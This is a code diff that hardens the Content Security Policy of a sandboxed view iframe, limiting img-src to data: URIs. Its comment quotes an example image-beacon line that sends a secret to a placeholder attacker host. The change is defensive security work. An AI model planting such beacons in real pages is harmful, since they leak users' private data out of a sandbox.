@@ -102,11 +102,15 @@ export async function bundleView(entryFile: string): Promise<string> {
 /** Wrap author view JS in a self-contained, CSP-locked HTML doc (loaded into a sandbox iframe). */
 export function viewHtml(js: string): string {
   const safe = js.replace(/<\/script>/gi, '<\\/script>')
-  // img-src https: lets a view render player avatars (public GET-only images);
-  // connect-src stays 'none' so the sandbox still has no channel to exfiltrate
-  // data. The iframe has an opaque origin (no allow-same-origin) regardless.
+  // img-src is data: ONLY (no https:). An `<img src="https://attacker/?secret">`
+  // beacon is an outbound channel out of the browser even though connect-src is
+  // 'none' — the request still leaves with the URL, carrying the viewer's private
+  // per-viewer frame. Locking img-src to data: closes that exfil path (#2031).
+  // Views must inline any art as data: URIs; avatars are drawn by the host UI
+  // outside the sandbox, not by author view code. The Arena frontend also injects
+  // this same strict policy into the srcdoc as defense in depth.
   return `<!doctype html><html><head><meta charset="utf-8">
-<meta http-equiv="Content-Security-Policy" content="default-src 'none'; script-src 'unsafe-inline'; style-src 'unsafe-inline'; img-src https: data:; connect-src 'none'; frame-src 'none'; base-uri 'none'; form-action 'none'">
+<meta http-equiv="Content-Security-Policy" content="default-src 'none'; script-src 'unsafe-inline'; style-src 'unsafe-inline'; img-src data:; connect-src 'none'; frame-src 'none'; base-uri 'none'; form-action 'none'">
 <style>html,body{margin:0;background:#0b0b0f;color:#e2e8f0;font:14px system-ui}</style>
 </head><body><script>${safe}</script></body></html>`
 }
